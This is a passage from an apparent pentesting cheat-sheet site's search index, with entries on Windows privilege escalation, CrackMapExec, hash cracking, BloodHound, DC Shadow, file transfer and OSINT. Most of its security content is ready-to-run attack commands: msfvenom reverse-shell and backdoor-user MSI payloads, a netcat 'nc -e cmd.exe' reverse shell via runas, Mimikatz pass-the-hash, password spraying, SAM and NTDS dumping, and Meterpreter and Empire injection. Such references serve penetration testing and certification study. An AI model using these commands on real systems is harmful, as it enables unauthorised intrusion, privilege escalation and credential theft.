quickly $ cat automigrate.rc run post/windows/manage/migrate msf5 \u0026gt; use exploit/multi/handler msf5 exploit(multi/handler) \u0026gt; set PAYLOAD windows/meterpreter/reverse_tcp msf5 exploit(multi/handler) \u0026gt; set LHOST xx.xx.xx.xx msf5 exploit(multi/handler) \u0026gt; set LPORT 5566 msf5 exploit(multi/handler) \u0026gt; set AutoRunScript multi_console_command -r /path/to/automigrate.rc msf5 exploit(multi/handler) \u0026gt; exploit \nFolder and Files Rights # icacls allows you to check for files and folder permissions C:\u0026gt; icacls Desktop/ C:\u0026gt; icacls root.txt # If you have rights on the folder but not especially on files, you can grant them C:\u0026gt; icacls root.txt /grant user:F \nUnquoted Paths # Some paths are vulnerable # It occurs because Windows will try for every whitespace, to find the binary in every intermediate folder C:\\Program Files\\something\\winamp.exe # You could place your payload in C:\\Program.exe C:\\Program Files.exe # The following command will display affected services wmic service get name,displayname,pathname,startmode |findstr /i \u0026#34;Auto\u0026#34; |findstr /i /v \u0026#34;C:\\Windows\\\\\u0026#34; |findstr /i /v \u0026#34;\u0026#34;\u0026#34; rmthelastquote\u0026#34; # Reverse shell msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=192.168.2.60 LPORT=8989 -f exe -o A.exe msf\u0026gt; upload -f A.exe sc stop \u0026#34;Vulnerable Service\u0026#34; # If can\u0026#39;t, you can reboot shutdown /r /t 0 # Session will die quickly, so it is necessary to automigrate # when a service starts in Windows operating systems, it must communicate with the Service Control Manager. # If it’s not, Service Control Manager thinks that something is not going well and terminates the process # MSF Module for this vulnerability exploit/windows/local/trusted_service_path \nRun As # If application is running as admin and credentials saved in there you can abuse it by modifying its properties that way: C:\\WINDOWS\\system32\\runas.exe /user:administrator /savecreds \u0026#34;C:\\Documents and Settings\\username\\Desktop\\nc.exe -nc 10.11.0.179 41337 -e C:\\Windows\\System32\\cmd.exe\u0026#34; # If you want to run a simple runas.exe: C:\\WINDOWS\\system32\\runas.exe /user:administrator /password:pass \u0026#34;C:\\Documents and Settings\\username\\Desktop\\nc.exe -nc 10.11.0.179 41337 -e C:\\Windows\\System32\\cmd.exe\u0026#34; \nAlwaysInstallElevated # It\u0026#39;s a setting allowing unprivileged users to run Windows Installer Packages Files (MSI) with elevated permissions (SYSTEM) # Check the value of this registry reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated # If set to 1, you can create your own MSI (or msi-nouac) # Add user msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi # Or reverse shell msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=192.168.2.60 LPORT=8989 -f exe -o Payload.exe msfvenom -f msi-nouac -p windows/exec cmd=\u0026#34;C:\\Users\\testuser\\AppData\\Local\\Temp\\Payload.exe\u0026#34; \u0026gt; malicious.msi # You can then use msiexec to execute the payload # /quiet = no msg to user, /qn = no GUI, /i = regular install (no admin) msiexec /quiet /qn /i C:\\evil.msi # MSF module exploit/windows/local/always_install_elevated \nPass the Hash using Machine Accounts # Need to be local admin on the target machine # Finding domain computers that are members of interesting groups Get-ADComputer -Filter * -Properties MemberOf | ? {$_.MemberOf} net group \u0026#34;domain admins\u0026#34; /domain net localgroup administrators /domain # After gaining local admin, hash machine extraction sekurlsa::logonPasswords # Compromised user can\u0026#39;t access the DC dir \\\\dc01\\c$ # You can use Mimikatz to PtH and elevate to domain admin because WS01$ is in Domain Admins sekurlsa::pth /user:ws01$ /domain:offense.local /ntlm:ab53503b0f35c9883ff89b75527d5861 \n"
},
{
	"uri": "/open-source-intelligence-osint/dorks/twitter_dorks/",
	"title": "Twitter Dorks",
	"tags": [],
	"description": "",
	"content": " Twitter Dorks https://twitter.com/BNFC_13/status/1160890864337600512 # Tweets containing word1 AND word2 (default operator) \u0026lt;word1\u0026gt; \u0026lt;word2\u0026gt; # Containing exact expression \u0026#34;word1\u0026#34; # Tweets containing word1 OR word 2 \u0026lt;word1\u0026gt; OR \u0026lt;word2\u0026gt; # Containing \u0026#34;cyber\u0026#34; but without \u0026#34;security\u0026#34; cyber -security # All tweets from an account or responding to an account from:\u0026lt;account\u0026gt; to:\u0026lt;account\u0026gt; # Filter results and display only results from followed accounts filter:follows exclude:medias # Tweets after the date or before the date \u0026lt;word\u0026gt; since:2015-02-20 \u0026lt;word\u0026gt; until:2015-02-20 # Minimal RT / likes / replies min_retweets:x min_faves:x min_replies:x # Language lang:fr # Tweets positive and negative \u0026lt;word\u0026gt; :) \u0026lt;word\u0026gt; :( # Tweets with a question \u0026lt;word\u0026gt; ? # Location (city) with a distance range near:Paris within:25km # Tweets corresponding to \u0026#34;gaming\u0026#34; according the filter # - safe : potentially hard or deleted # - media : pictures or videos # - retweets : only retweets # - native_video : downloaded video (Amplify, Periscope, Vine) # - periscope # - vine # - images : identified as photos (also coming from Instagram) # - twimg : pic.twitter.com links # - links : links to an URL gaming filter:\u0026lt;filter\u0026gt;"
},
{
	"uri": "/open-source-intelligence-osint/company_investigations/wayback_machine/",
	"title": "Wayback Web Archive",
	"tags": [],
	"description": "",
	"content": " Wayback Machine (https://archive.org/web/) # You can also uses as CLI tool https://github.com/tomnomnom/waybackurls cat domains.txt | waybackurls \u0026gt; urls # Cache pages http://cachedview.com/ https://www.giftofspeed.com/cache-checker/ \nGetting PDF on Web Archive # Great resource https://openfacto.fr/2020/04/19/recuperer-des-fichiers-pdf-en-masse-sur-archive-org/ # Step 1 # By adding \u0026#39;*\u0026#39; at the and of a company URL, you can get all indexed documents # Then you can filter by \u0026#34;PDF\u0026#34; (right search bar) https://web.archive.org/web/*/https://testcompany.fr/* # Step 2 # Here you want to get URL list # In the Firefox developer tools -\u0026gt; Network # You can get an HTTP request to a JSON file containing URLs # Copy as curl and get the file # Step 3 # OpenRefine can help to parse and process the file # Filter on PDF # Step 4 # NEVER download directly # You can do it through archived document # Add the prefix for every line https://web.archive.org/web/ # Step 5 # To get the document, the \u0026#39;*\u0026#39; in URL must be replaced by the timestamp # If several documents have been indexed (you can download the first, or the last) # Also, add \u0026#34;if_\u0026#34; https://web.archive.org/web/20160102030102if_/http://www.xxx.fr/document.pdf"
},
{
	"uri": "/web-pentest/",
	"title": "Web Pentest",
	"tags": [],
	"description": "",
	"content": "Check menu on the left for content . .;;............ .. .;;;;::::::::::::.. ':;;:::::::::::: . . ':  "
},
{
	"uri": "/network/services-enumeration/25_smtp/",
	"title": "25 - SMTP",
	"tags": [],
	"description": "",
	"content": " Identification # Connection and test using telnet telnet \u0026lt;IP\u0026gt; 25 EHLO \u0026lt;IP\u0026gt; VRFY root EXPN root Mail from: me@test.com To: root@test.com Data: Subject: Message Hi, Just a test message. (Double carriage return) \nEnumeration # using smtp-user-enum script smtp-user-enum -M VRFY -U users.txt -t \u0026lt;IP\u0026gt;"
},
{
	"uri": "/web-pentest/content-management-system-cms/",
	"title": "Content Management Systems (CMS)",
	"tags": [],
	"description": "",
	"content": "Check menu on the left for content . .;;............ .. .;;;;::::::::::::.. ':;;:::::::::::: . . ':  "
},
{
	"uri": "/windows-systems/exploitation/crackmapexec/",
	"title": "CrackMapExec",
	"tags": [],
	"description": "",
	"content": " TOC  Connexions \u0026amp; Spraying Enumeration Execution \u0026amp; Co Getting credentials Using the database Modules Getting shells  # General help crackmapexec --help # Protocol help cracmapexec smb --help \nConnexions \u0026amp; Spraying # Target format crackmapexec smb ms.evilcorp.org crackmapexec smb 192.168.1.0 192.168.0.2 crackmapexec smb 192.168.1.0-28 10.0.0.1-67 crackmapexec smb 192.168.1.0/24 crackmapexec smb targets.txt# Null session crackmapexec smb 192.168.10.1 -u \u0026#34;\u0026#34; up \u0026#34;\u0026#34;# Connect to target using local account crackmapexec smb 192.168.215.138 -u \u0026#39;Administrator\u0026#39; -p \u0026#39;PASSWORD\u0026#39; --local-auth# Pass the hash against a subnet crackmapexec smb 172.16.157.0/24 -u administrator -H \u0026#39;LMHASH:NTHASH\u0026#39; --local-auth crackmapexec smb 172.16.157.0/24 -u administrator -H \u0026#39;NTHASH\u0026#39;# Bruteforcing and Password Spraying crackmapexec smb 192.168.100.0/24 -u \u0026#34;admin\u0026#34; -p \u0026#34;password1\u0026#34; crackmapexec smb 192.168.100.0/24 -u \u0026#34;admin\u0026#34; -p \u0026#34;password1\u0026#34; \u0026#34;password2\u0026#34; crackmapexec smb 192.168.100.0/24 -u \u0026#34;admin1\u0026#34; \u0026#34;admin2\u0026#34; -p \u0026#34;P@ssword\u0026#34; crackmapexec smb 192.168.100.0/24 -u user_file.txt -p pass_file.txt crackmapexec smb 192.168.100.0/24 -u user_file.txt -H ntlm_hashFile.txt \nEnumeration Users # Enumerate users crackmapexec smb 192.168.215.104 -u \u0026#39;user\u0026#39; -p \u0026#39;PASS\u0026#39; --users # Perform RID Bruteforce to get users crackmapexec smb 192.168.215.104 -u \u0026#39;user\u0026#39; -p \u0026#39;PASS\u0026#39; --rid-brute # Enumerate domain groups crackmapexec smb 192.168.215.104 -u \u0026#39;user\u0026#39; -p \u0026#39;PASS\u0026#39; --groups # Enumerate local users crackmapexec smb 192.168.215.104 -u \u0026#39;user\u0026#39; -p \u0026#39;PASS\u0026#39; --local-users Hosts # Generate a list of relayable hosts (SMB Signing disabled) crackmapexec smb 192.168.1.0/24 --gen-relay-list output.txt # Enumerate available shares crackmapexec smb 192.168.215.138 -u \u0026#39;user\u0026#39; -p \u0026#39;PASSWORD\u0026#39; --local-auth --shares # Get the active sessions crackmapexec smb 192.168.215.104 -u \u0026#39;user\u0026#39; -p \u0026#39;PASS\u0026#39; --sessions # Check logged in users crackmapexec smb 192.168.215.104 -u \u0026#39;user\u0026#39; -p \u0026#39;PASS\u0026#39; --lusers # Get the password policy crackmapexec smb 192.168.215.104 -u \u0026#39;user\u0026#39; -p \u0026#39;PASS\u0026#39; --pass-pol \nExecution \u0026amp; Co # CrackMapExec has 3 different command execution methods (in default order) : # - wmiexec --\u0026gt; WMI # - atexec --\u0026gt; scheduled task # - smbexec --\u0026gt; creating and running a service # Execute command through cmd.exe (admin privileges required) crackmapexec smb 192.168.10.11 -u Administrator -p \u0026#39;P@ssw0rd\u0026#39; -x \u0026#39;whoami\u0026#39; # Force the smbexec method crackmapexec smb 192.168.215.104 -u \u0026#39;Administrator\u0026#39; -p \u0026#39;PASS\u0026#39; -x \u0026#39;net user Administrator /domain\u0026#39; --exec-method smbexec # Execute commands through PowerShell (admin privileges required) crackmapexec smb 192.168.10.11 -u Administrator -p \u0026#39;P@ssw0rd\u0026#39; -X \u0026#39;whoami\u0026#39; \nGetting Credentials # Dump local SAM hashes crackmapexec smb 192.168.215.104 -u \u0026#39;Administrator\u0026#39; -p \u0026#39;PASS\u0026#39; --local-auth --sam# Enable or disable WDigest to get credentials from the LSA Memory crackmapexec smb 192.168.215.104 -u \u0026#39;Administrator\u0026#39; -p \u0026#39;PASS\u0026#39; --local-auth --wdigest enable crackmapexec smb 192.168.215.104 -u \u0026#39;Administrator\u0026#39; -p \u0026#39;PASS\u0026#39; --local-auth --wdigest disable # Then you juste have to wait the user logoff and logon again # But you can force the logoff crackmapexec smb 192.168.215.104 -u \u0026#39;Administrator\u0026#39; -p \u0026#39;PASS\u0026#39; -x \u0026#39;quser\u0026#39; crackmapexec smb 192.168.215.104 -u \u0026#39;Administrator\u0026#39; -p \u0026#39;PASS\u0026#39; -x \u0026#39;logoff \u0026lt;sessionid\u0026gt;\u0026#39;# Dump the NTDS.dit from DC using methods from secretsdump.py # Uses drsuapi RPC interface create a handle, trigger replication # and combined with additional drsuapi calls to convert the resultant # linked-lists into readable format crackmapexec smb 192.168.1.100 -u UserNAme -p \u0026#39;PASSWORDHERE\u0026#39; --ntds # Uses the Volume Shadow copy Service crackmapexec smb 192.168.1.100 -u UserNAme -p \u0026#39;PASSWORDHERE\u0026#39; --ntds vss # Dump the NTDS.dit password history smb 192.168.1.0/24 -u UserNAme -p \u0026#39;PASSWORDHERE\u0026#39; --ntds-history \nUsing the database # The database automatically store every hosts reaches by CME and all credentials with admin access $ cmedb # Using workspaces cmedb\u0026gt; workspace create test cmedb\u0026gt; workspace test # Access a protocol database and switch back cmedb (test)\u0026gt; proto smb cmedb (test)\u0026gt; back # List stored hosts cmedb\u0026gt; hosts # View detailed infos for a specific machine (including creds) cmedb\u0026gt; hosts \u0026lt;hostname\u0026gt; # Get stored credentials cmedb\u0026gt; creds # Get credentials access for a specific account cmedb\u0026gt; creds \u0026lt;username\u0026gt; # Using credentials from the database crackmapexec smb 192.168.100.1 -id \u0026lt;credsID\u0026gt; \nModules # List available modules crackmapexec smb -L # Module information crackmapexec smb -M mimikatz --module-info # View module options crackmapexec smb -M mimikatz --options # Mimikatz module crackmapexec smb 192.168.215.104 -u \u0026#39;Administrator\u0026#39; -p \u0026#39;PASS\u0026#39; --local-auth -M mimikatz crackmapexec smb 192.168.215.104 -u \u0026#39;Administrator\u0026#39; -p \u0026#39;PASS\u0026#39; -M mimikatz crackmapexec smb 192.168.215.104 -u Administrator -p \u0026#39;P@ssw0rd\u0026#39; -M mimikatz -o COMMAND=\u0026#39;privilege::debug\u0026#39;[*] Get-ComputerDetails Enumerates sysinfo [*] bloodhound Executes the BloodHound recon script on the target and retreives the results to the attackers\\\u0026#39; machine [*] empire_exec Uses Empire\\\u0026#39;s RESTful API to generate a launcher for the specified listener and executes it [*] enum_avproducts Gathers information on all endpoint protection solutions installed on the the remote host(s) via WMI [*] enum_chrome Decrypts saved Chrome passwords using Get-ChromeDump [*] enum_dns Uses WMI to dump DNS from an AD DNS Server [*] get_keystrokes Logs keys pressed, time and the active window [*] get_netdomaincontroller Enumerates all domain controllers [*] get_netrdpsession Enumerates all active RDP sessions [*] get_timedscreenshot Takes screenshots at a regular interval [*] gpp_autologin Searches the domain controller for registry.xml to find autologon information and returns the username and password. [*] gpp_password Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences. [*] invoke_sessiongopher Digs up saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using SessionGopher [*] invoke_vnc Injects a VNC client in memory [*] met_inject Downloads the Meterpreter stager and injects it into memory [*] mimikatz Dumps all logon credentials from memory [*] mimikatz_enum_chrome Decrypts saved Chrome passwords using Mimikatz [*] mimikatz_enum_vault_creds Decrypts saved credentials in Windows Vault/Credential Manager [*] mimikittenz Executes Mimikittenz [*] multirdp Patches terminal services in memory to allow multiple RDP users [*] netripper Capture`\\\u0026#39;s credentials by using API hooking [*] pe_inject Downloads the specified DLL/EXE and injects it into memory [*] rdp Enables/Disables RDP [*] scuffy Creates and dumps an arbitrary .scf file with the icon property containing a UNC path to the declared SMB server against all writeable shares [*] shellcode_inject Downloads the specified raw shellcode and injects it into memory [*] slinky Creates windows shortcuts with the icon attribute containing a UNC path to the specified SMB server in all shares with write permissions [*] test_connection Pings a host [*] tokens Enumerates available tokens [*] uac Checks UAC status [*] wdigest Creates/Deletes the \u0026#39;UseLogonCredential\u0026#39; registry key enabling WDigest cred dumping on Windows \u0026gt;= 8.1 [*] web_delivery Kicks off a Metasploit Payload using the exploit/multi/script/web_delivery module \nGetting shells Metasploit # First, set up a HTTP Reverse Handler msf \u0026gt; use exploit/multi/handler msf exploit(handler) \u0026gt; set payload windows/meterpreter/reverse_https msf exploit(handler) \u0026gt; set LHOST 192.168.10.3 msf exploit(handler) \u0026gt; set exitonsession false msf exploit(handler) \u0026gt; exploit -j # Met_Inject module crackmapexec smb 192.168.215.104 -u \u0026#39;Administrator\u0026#39; -p \u0026#39;PASS\u0026#39; --local-auth -M met_inject -o LHOST=YOURIP LPORT=4444  Empire # Start RESTful API empire --rest --user empireadmin --pass gH25Iv1K68@^ # First setup an Empire HTTP listener (Empire: listeners) \u0026gt; set Name test (Empire: listeners) \u0026gt; set Host 192.168.10.3 (Empire: listeners) \u0026gt; set Port 9090 (Empire: listeners) \u0026gt; set CertPath data/empire.pem (Empire: listeners) \u0026gt; run (Empire: listeners) \u0026gt; list # Start RESTful API # The username and password that CME uses to authenticate to Empire\u0026#39;s RESTful API # Are stored in the cme.conf file located at ~/.cme/cme.conf empire --rest --user empireadmin --pass gH25Iv1K68@^ # Empire Module crackmapexec smb 192.168.215.104 -u Administrator -p PASSWORD --local-auth -M empire_exec -o LISTENER=CMETest"
},
{
	"uri": "/passcracking-hashfiles/cracking_files/",
	"title": "Cracking files",
	"tags": [],
	"description": "",
	"content": " Cracking archives # RAR rar2john file.rar \u0026gt; rar_hashes.txt john --wordlist=passwords.txt rar_hashes.txt # ZIP zip2john file.rar \u0026gt; zip_hashes.txt john --wordlist=passwords.txt zip_hashes.txt # ZIP Using fcrackzip fcrackzip -u -D -p rockyou.txt recup.zip \nCracking shadow files unshadow passwd shadow \u0026gt; shadowjohn.txt john --wordlist=/home/user/Desktop/Certifs/OSCP/Tools/Wordlist/Bruteforce/rockyou.txt --rules shadowjohn.txt john --show shadowjohn.txt # Hashcat SHA512 $6$ shadow file hashcat -m 1800 -a 0 hash.txt rockyou.txt --username #Hashcat MD5 $1$ shadow file hashcat -m 500 -a 0 hash.txt rockyou.txt --username \nVarious cracking techniques # Hashcat MD5 Apache webdav file hashcat -m 1600 -a 0 hash.txt rockyou.txt # Hashcat SHA1 hashcat -m 100 -a 0 hash.txt rockyou.txt --force # Hashcat Wordpress hashcat -m 400 -a 0 --remove hash.txt rockyou.txt # SSH Key ssh2john id_rsa \u0026gt; sshtocrack john --wordlist=/usr/share/wordlists/rockyou.txt sshtocrack # Cracking Cisco passwords # Type 5 → MD5 # Type 7 → Easy reversible hashcat -m 500 c:\\temp\\ciscohash.txt C:\\DICS\\english-dic.txt # Cracking NTLVMv2 hashes john --format=netntlmv2 --wordlist=\u0026#34;/usr/share/wordlists/rockyou.txt\u0026#34; hash.txt  \nCracking TGS # Using John from bleeding repo: Go here /home/user/Desktop/Certifs/OSCP/Tools/PasswordCracking/JohnTheRipper/run ./john --wordlist=/home/user/Desktop/Certifs/OSCP/Tools/Wordlist/Bruteforce/rockyou.txt --fork=4 --format=krb5tgs /home/user/Desktop/HackTheBox/VM/Active/kerberos_hashes.txt"
},
{
	"uri": "/open-source-intelligence-osint/human-recon/leaks/",
	"title": "Credentials Leaks",
	"tags": [],
	"description": "",
	"content": " Pastebeen # \u0026#34;We download, analyze and classify all the pastes that are posted online.\u0026#34; https://pastebeen.com/ # The tool can be used in order to crawl deleted pastebin files or to recover data like leaks. \nPwnedOrNot https://github.com/thewhiteh4t/pwnedOrNot.git # Simple python tool used to check haveIbeenpwned leaks for an e-mail or a list # The tool will then check if the dump is accessible (using haveibeenpwned/pastebin) to get passwords python pwnedornot.py -h python pwnedornot.py -e email@test.com python pwnedornot.py -f file.txt \nPwndb.py # Tool using onion website http://pwndb2am4tzkvold.onion/ to search leaks and retrieve known passwords python pwndb.py --target email@test.fr python pwndb.py --list file python pwndb.py --target email@test.fr --ouput file \nOnline tools https://dehashed.com https://haveibeenpwned.com https://breachdirectory.tk/ \nh8mail (https://github.com/khast3x/h8mail) # Email OSINT and password finder # Usefull when targetting specific emails # It uses different sources to get information (HaveIBeenPwned, Shodan, Hunter.io Public \u0026amp; Free tier, WeLeakInfo Public \u0026amp; Service, Snusbase) # NodeJS is required to bypass CloudFlare. Docker is available # Basic python h8mail.py -t target@example.com # Several target and API keys python h8mail.py -t targets.txt -c config.ini -o pwned_targets.csv # Queries through local copy of Breachcompilation and API key for Snusbase python h8mail.py -t targets.txt -bc ../Downloads/BreachCompilation/ -k \u0026#34;snusbase_url:$snusbase_url,snusbase_token:$snusbase_token\u0026#34; # No API call python h8mail.py -t targets.txt -bc ../Downloads/BreachCompilation/ --local # Chasing (using hunter.io to get new emails) $ h8mail -t john.smith@fcorp.com --chase 2 -k \u0026#34;hunterio:abc1234\u0026#34; \nLeaked 2.1 (https://github.com/GitHackTools/Leaked) # Another research tool for email and passwords # You can search for password hashes, hash leaked or email leaked # It uses python leakz module python leaked.py"
},
{
	"uri": "/open-source-intelligence-osint/technical-recon/misc/cryptocurrency_investigation/",
	"title": "Cryptocurrency Investigation",
	"tags": [],
	"description": "",
	"content": " Orbit - Cryto Wallet Analysis # Give it a blockchain based crypto wallet address and it will crawl 3 levels deep in transaction data to plot a graph out of the information. python3 orbit.py # Next thing is to plot a graph for which we will be using quark framework # Then use the html output python quark.py /path/to/file.json \n"
},
{
	"uri": "/windows-systems/post-exploitation-techniques/dc_shadow/",
	"title": "DC Shadow",
	"tags": [],
	"description": "",
	"content": "# DC Shadow is a post compromission attack, allowing you to update replication metadata # On a compromised client, using a domain admin account # You can attack with Mimikatz# Terminal 1 (runas) mimikatz # !+ mimikatz # !processtoken mimikatz # lsadump::dcshadow /object:dtargaryen /attribute:description /value:\u0026#34;The Game\u0026#34; /replOriginatingUid:{00000000-0000-0000-0000-000000000000} /replOriginatingTime:\u0026#34;2017-01-01 09:00:00\u0026#34; /replOriginatingUsn:42# Terminal 2 (runas) mimikatz # lsadump::dcshadow /push# You can check the success throught repadmin on the DC repadmin /showobjmeta DC01.NORZH.LAN \u0026#34;CN=Daenerys Targaryen,CN=Users,DC=NORZH,DC=LAN\u0026#34;"
},
{
	"uri": "/web-pentest/files-and-files-inclusions/directory_file_discovery/",
	"title": "Directory &amp; File Discovery",
	"tags": [],
	"description": "",
	"content": " Test for directory traversal  \nGeneral \u0026amp; Tricks # Check for .git # If there is a git, possible to download the source code # Check for temp saved files # Vim creates .swp files index.php/.admin.html.swp # Path traversal cheat sheet https://www.gracefulsecurity.com/path-traversal-cheat-sheet-linux/ https://pentestwiki.org/wiki/Path_traversal#Windows \nPatator # Fuzzing patator http_fuzz url=http://10.10.10.150/FILE0 0=wordlist.txt -x ignore:code=400 -x ignore:code=404 # Auth basic patator http_fuzz url=https://IP/FILE0 0=.wordlisttxt -x ignore:code=400 -x ignore:code=404 header=\u0026#39;Authorization: Basic YOUR_BASE64_HERE\u0026#39; # Admin wordlist patator http_fuzz url=\u0026#39;url/FILE0\u0026#39; 0=wordlist/admin.lst -x ignore:code=400 -x ignore:code=404 -x ignore:code=403 # Directory wordlist (dirbuster) patator http_fuzz url=\u0026#39;url/FILE0\u0026#39; 0=wordlist/directory-lowercase.txt -x ignore:code=400 -x ignore:code=404 -x ignore:code=403 # File wordlist (raft) patator http_fuzz url=\u0026#39;url/FILE0\u0026#39; 0=wordlist/raft-lowercase.txt -x ignore:code=400 -x ignore:code=404 -x ignore:code=403 \nDIRs endpoits /uplynk/examples/dash.html"
},
{
	"uri": "/windows-systems/network-and-domain-recon/domain_mapping/",
	"title": "Domain Mapping",
	"tags": [],
	"description": "",
	"content": " BloodHound # /!\\ Information here might be outdated # Future update incoming Tips # Right Click # Get information about the node and also how to compromise the user / machine # Owned # Can be usefull during an internal pentest to note where you are # Nodes will be tagged with a skull # It\u0026#39;s then possible to ask the shortest path to a node from the owned ones # Filters # Can be usefull # Shortcuts # CTRL --\u0026gt; Change node display # CTRL+SHIFT+I --\u0026gt; Developper Tools # CTRL+R --\u0026gt; Reload display # Still possible to edit data to set what you want# If you don\u0026#39;t have access to a domain machine but have creds # You can run from host runas /netonly /user:FQDN.local\\USER powershell # Then Import-Module Sharphound.ps1 Invoke-BloodHound -ZipFileName \u0026#39;PATH/TO/ZIP.zip\u0026#39; -JsonFolder \u0026#39;PATH/TO/folderas above\u0026#39; -CollectionMethod All -Domain FQDN Setup # Bloodhound directement depuis la machine cible # apt-get install bloodhound # Setup $ sudo neo4j console ... ... http://localhost:7474 user/pass = neo4j/neo4j # Start $ bloodhound URL : bolt://127.0.0.1:7687 Target Collection # On the target, drop the Sharphound ingestor # You can drop it through shared folder or by download https://github.com/BloodHoundAD/BloodHound https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1 # Powershell Powershell.exe -Exec Bypass Import-Module .\\Sharphound.ps1 Invoke-Bloodhound Invoke-BloodHound -CollectionMethod All # Default : Domains, Computers, Users, Groups # All : Domains, Computers, Users, Groups, OUs, GPOs # Exe # You may need some .NET packages C:\\\u0026gt; SharpHound.exe C:\\\u0026gt; SharpHound.exe — CollectionMethod SessionLoop — MaxLoopTime 1h C:\\\u0026gt; SharpHound.exe — CollectionMethod ACL .\\SharpHound.exe --domain UCA.LAN --domaincontroller 192.168.30.10 --ldapusername \u0026#34;die-hardman\u0026#34; --ldappassword \u0026#34;maskonyourface\u0026#34; --CollectionMethod Group,LocalGroup,GPOLocalGroup,Session,LoggedOn,ObjectProps,ACL,ComputerOnly,Trusts,Default,RDP,DCOM,DCOnly# Python based ingestor (for remote work) https://github.com/fox-it/BloodHound.py # Collection Methods : Default, Group, LocalAdmin, RDP, DCOM, Session, Acl, Trusts, LoggedOn, ObjectProps, All (except LoggedOn) bloodhound-python -u USERNAME -p PASSWORD -d DOMAIN --collectionmethod All,LoggedOn# Drop BloodHound ingestor and get results back through SMB Server python -m SimpleHTTPServer Invoke-WebRequest -Uri “http://10.10.16.112:8000/SharpHound.ps1” -OutFile “.\\SharpHound.ps1” Powershell.exe -Exec Bypass Import-Module .\\Sharphound.ps1 Invoke-Bloodhound Invoke-BloodHound -CollectionMethod All # Since Windows 10 you can\u0026#39;t do anonymous smbserver anymore sudo python smbserver.py SDFR /BloodHound/Ingestors -smb2support -username \u0026#34;peon\u0026#34; -password \u0026#34;peon\u0026#34; net use Z: \\\\192.168.30.130\\SDFR /user:peon peon net use Z: /delete /y copy C:\\Users\\xxx\\Documents\\20191104044628_BloodHound.zip \\\\10.10.16.112\\TESTLOL\\file.zip Analysis # Results will be zipped # Get back zip, unzip it and upload files into bloodhound# Custom queries https://github.com/hausec/Bloodhound-Custom-Queries # Replace or update the following file C:\\Users[USERNAME]\\AppData\\Roaming\\BloodHound\\customqueries.json # Automated, extensible toolset that runs cypher queries against Bloodhound\u0026#39;s Neo4j backend and saves output to spreadsheets. https://github.com/seajaysec/cypheroth/ ./cypheroth.sh -u neo4j -p BloodHound -d TESTLAB.LOCAL ./cypheroth.sh -u neo4j -p hunter2 -d BigTech.corp -a 10.0.0.1:7687 -t 5m -v true # Some quickwin queries against a BloodHound database https://github.com/kaluche/bloodhound-quickwin \nPingCastle Lien : https://www.pingcastle.com/PingCastleFiles/PingCastle_2.4.3.0.zip \u0026gt; Drop exe on the target \u0026gt; Run Pingcastle.exe (mode interactif par défaut) \u0026gt; Healthcare (enter) et domaine (*) \u0026gt; Mode CLI : \u0026gt; PingCastle --healthcheck --server mydomain.com \u0026gt; PingCastle --carto \nADACLScanner TODO\n"
},
{
	"uri": "/windows-systems/exploitation/",
	"title": "Exploitation",
	"tags": [],
	"description": "",
	"content": "Check menu on the left for content . .;;............ .. .;;;;::::::::::::.. ':;;:::::::::::: . . ':  "
},
{
	"uri": "/linux-systems/file_transfer/",
	"title": "File Transfer",
	"tags": [],
	"description": "",
	"content": " NFS # You can remotely mount NFS volumes mount -t nfs xx.xx.xx.xx:/ /tmp/a \nLinux FTP #!/bin/sh  ftp -n IP \u0026lt;\u0026lt;END_SCRIPT quote USER acknak quote PASS jLQRZy4gyLhmMqz2whTw binary GET file.py quit END_SCRIPT exit 0 # Can also be done over php: \u0026lt;?php echo shell_exec(\u0026#34;echo open 192.168.42.102 21\u0026gt;/usr/local/databases/ftp.txt\u0026#34;);?\u0026gt; \u0026lt;?php echo shell_exec(\u0026#34;echo user acknak jLQRZy4gyLhmMqz2whTw\u0026gt;\u0026gt; /usr/local/databases/ftp.txt\u0026#34;);?\u0026gt; \u0026lt;?php echo shell_exec(\u0026#34;echo binary\u0026gt;\u0026gt; /usr/local/databases/ftp.txt\u0026#34;);?\u0026gt; \u0026lt;?php echo shell_exec(\u0026#34;echo get netcat /usr/local/databases/netcat\u0026gt;\u0026gt;/usr/local/databases/ftp.txt\u0026#34;);?\u0026gt; \u0026lt;?php echo shell_exec(\u0026#34;echo bye\u0026gt;\u0026gt; /usr/local/databases/ftp.txt\u0026#34;);?\u0026gt; \u0026lt;?php echo shell_exec(\u0026#34;ftp -n \u0026lt; /usr/local/databases/ftp.txt\u0026#34;);?\u0026gt;"
},
{
	"uri": "/open-source-intelligence-osint/tools-and-methodology/firefox_addons/",
	"title": "Firefox addons",
	"tags": [],
	"description": "",
	"content": " OSINT Bookmarks https://www.osintcombine.com/osint-bookmarks \nFlag Fox Flagfox is an extension that displays a flag icon indicating the current webserver\u0026rsquo;s physical location.\nIt then launch a geotool webpage to get more informations about the website you are visiting About IP \u0026amp; Domain.\nGoogle Cache Google Cache lets you visit retrieve the web page from Google Web Cache when the site is offline.\nIf the site is offline, you can just press toolbar button and request cached version of the page from Google Cache.\nLink Gopher Extracts all links from web page, sorts them, removes duplicates, and displays them in a new tab for copy and paste into other systems.\nAlso extracts embedded, referrertype links in the format http://www.example.com/go?url=http://www.example.com/foo\nAlso displays a distilled list of unique domain names used in the links.\nSputnik Complete OSINT web extension.\nRightclick on a link and you can request many resources for the IP, domain or URL.\nVirus total, Shodan, Onyphe\u0026hellip;\nTinEye Reverse Image Search TinEye is a reverse image search engine.\nThe extension adds a context menu item so you can search for an image to find out where it came from.\nHow it is being used, if modified versions of the image exist, or to find higher resolution versions.\nWho stole my pictures? Search for copies of the images using Yandex.ru, Tineye.com, Google.com, Baidu.com, Bing.com and VK.com via right click menu.\n"
},
{
	"uri": "/open-source-intelligence-osint/dorks/github_dorks/",
	"title": "Github Dorks",
	"tags": [],
	"description": "",
